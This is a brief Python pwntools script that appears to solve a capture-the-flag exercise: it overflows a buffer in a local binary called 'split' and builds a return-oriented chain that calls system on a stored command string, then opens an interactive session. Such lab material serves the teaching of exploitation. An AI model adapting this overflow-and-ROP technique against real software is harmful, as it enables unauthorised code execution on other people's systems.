from pwn import *

context.bits = 64

p = process("./split")

pop_rdi = 0x00000000004007c3
system = 0x000000000040074b
bincat = 0x00601060

payload = b"A"*40 + p64(pop_rdi) + p64(bincat) + p64(system)

p.send(payload)
p.interactive()
